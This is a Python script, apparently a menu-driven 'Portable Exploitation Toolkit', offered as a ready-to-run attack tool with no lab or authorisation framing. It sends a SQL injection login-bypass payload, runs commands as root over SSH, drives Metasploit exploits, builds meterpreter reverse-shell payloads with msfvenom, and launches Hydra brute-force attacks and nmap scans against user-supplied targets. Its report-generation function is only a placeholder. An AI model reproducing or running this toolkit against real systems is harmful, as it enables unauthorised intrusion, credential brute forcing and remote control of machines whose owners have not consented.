import requests
import subprocess
from colorama import init, Fore, Style
import os
import time

# Initialize colorama for colored outputs
init(autoreset=True)

# Function to exploit a web application with SQL injection
def exploit_web_application(target_url):
    injection_payload = "' OR 1=1 --"
    url = f"{target_url}/login"
    data = {"username": injection_payload, "password": ""}
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        if "Login Successful" in response.text:
            print(Fore.GREEN + f"[+] SQL Injection successful on {target_url}!")
            print(f"[+] Response:\n{response.text}")
        else:
            print(Fore.RED + f"[-] SQL Injection failed on {target_url}.")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Error occurred: {e}")
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error occurred: {e}")

# Function to execute a command remotely via SSH
def execute_command_remote(target_ip, command):
    ssh_command = f"ssh root@{target_ip} '{command}'"
    try:
        result = subprocess.run(ssh_command, shell=True, capture_output=True, text=True)
        result.check_returncode()
        print(Fore.GREEN + f"[+] Command executed successfully on {target_ip}:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Failed to execute command on {target_ip}:")
        print(e.stderr)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error occurred: {e}")

# Function to automate a Metasploit exploit
def metasploit_exploit(target_ip, exploit_module, payload):
    msfconsole_command = f"msfconsole -q -x 'use {exploit_module}; set RHOSTS {target_ip}; set PAYLOAD {payload}; exploit;'"
    try:
        result = subprocess.run(msfconsole_command, shell=True, capture_output=True, text=True, timeout=300)
        result.check_returncode()
        print(Fore.GREEN + result.stdout)
    except subprocess.TimeoutExpired:
        print(Fore.RED + "[-] Exploit timed out after 5 minutes.")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Error executing Metasploit exploit:")
        print(e.stderr)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error occurred: {e}")

# Function for scanning vulnerabilities using OWASP ZAP
def zap_scan(target_url):
    try:
        subprocess.run(["zap-cli", "quick-scan", "-r", "-t", target_url], check=True)
        print(Fore.GREEN + f"[+] OWASP ZAP scan completed for {target_url}.")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] OWASP ZAP scan failed for {target_url}:")
        print(e.stderr)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error occurred: {e}")

# Function for generating a reverse shell payload
def generate_reverse_shell_payload(lhost, lport, payload_format="python"):
    try:
        payload_name = f"reverse_shell.{payload_format}"
        subprocess.run(["msfvenom", "-p", f"{payload_format}/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw", "-o", payload_name], check=True)
        print(Fore.GREEN + f"[+] Reverse shell payload generated: {payload_name}")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Failed to generate reverse shell payload:")
        print(e.stderr)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error occurred: {e}")

# Function for performing nmap scan
def nmap_scan(target_ip):
    try:
        print(Fore.GREEN + f"[+] Starting nmap scan for {target_ip}...")
        result = subprocess.run(["nmap", "-sS", "-Pn", target_ip], capture_output=True, text=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] nmap scan failed for {target_ip}:")
        print(e.stderr)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error occurred: {e}")

# Function for Hydra brute force attack
def hydra_brute_force(target_ip, service, username_file, password_file):
    try:
        print(Fore.GREEN + f"[+] Starting Hydra brute force attack on {service} at {target_ip}...")
        result = subprocess.run(["hydra", "-L", username_file, "-P", password_file, target_ip, service], capture_output=True, text=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Hydra brute force attack failed:")
        print(e.stderr)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error occurred: {e}")

# Function for launching Burp Suite and intercepting traffic
def launch_burp_suite():
    try:
        print(Fore.GREEN + "[+] Launching Burp Suite...")
        # Replace with actual command to launch Burp Suite
        subprocess.Popen(["burpsuite"])
        print(Fore.GREEN + "[+] Burp Suite launched successfully.")
        print(Fore.GREEN + "[+] Configure your browser to use Burp Suite's proxy.")
        print(Fore.GREEN + "[+] Start intercepting traffic in Burp Suite.")
    except Exception as e:
        print(Fore.RED + f"[-] Failed to launch Burp Suite:")
        print(e)

# Function for automated report generation
def generate_report():
    try:
        print(Fore.GREEN + "[+] Generating automated report...")
        # Replace with code to generate and save automated report
        time.sleep(2)  # Placeholder for report generation simulation
        print(Fore.GREEN + "[+] Automated report generated successfully.")
    except Exception as e:
        print(Fore.RED + f"[-] Failed to generate automated report:")
        print(e)

# Function for handling main menu and user interaction
def main_menu():
    print("\n=== Portable Exploitation Toolkit ===")
    print("1. Exploit Web Application (SQL Injection)")
    print("2. Execute Command Remotely")
    print("3. Metasploit Exploit")
    print("4. Scan with OWASP ZAP")
    print("5. Generate Reverse Shell Payload")
    print("6. Perform nmap Scan")
    print("7. Perform Hydra Brute Force Attack")
    print("8. Launch Burp Suite and Intercept Traffic")
    print("9. Automated Report Generation")
    print("10. Exit")

    choice = input("\nEnter your choice: ")
    return choice

# Main function to execute the toolkit
def main():
    while True:
        choice = main_menu()

        if choice == "1":
            target_url = input("Enter the target URL: ")
            exploit_web_application(target_url)
        elif choice == "2":
            target_ip = input("Enter the target IP address: ")
            command_to_execute = input("Enter the command to execute: ")
            execute_command_remote(target_ip, command_to_execute)
        elif choice == "3":
            target_ip = input("Enter the target IP address: ")
            exploit_module = input("Enter the Metasploit exploit module: ")
            payload = input("Enter the payload to use: ")
            metasploit_exploit(target_ip, exploit_module, payload)
        elif choice == "4":
            target_url = input("Enter the target URL to scan with OWASP ZAP: ")
            zap_scan(target_url)
        elif choice == "5":
            lhost = input("Enter your local IP address (LHOST): ")
            lport = input("Enter the local port (LPORT) for reverse shell: ")
            generate_reverse_shell_payload(lhost, lport)
        elif choice == "6":
            target_ip = input("Enter the target IP address for nmap scan: ")
            nmap_scan(target_ip)
        elif choice == "7":
            target_ip = input("Enter the target IP address for Hydra attack: ")
            service = input("Enter the service (e.g., ssh, ftp): ")
            username_file = input("Enter the file containing usernames: ")
            password_file = input("Enter the file containing passwords: ")
            hydra_brute_force(target_ip, service, username_file, password_file)
        elif choice == "8":
            launch_burp_suite()
        elif choice == "9":
            generate_report()
        elif choice == "10":
            print(Fore.YELLOW + "Exiting the Portable Exploitation Toolkit.")
            break
        else:
            print(Fore.RED + "Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
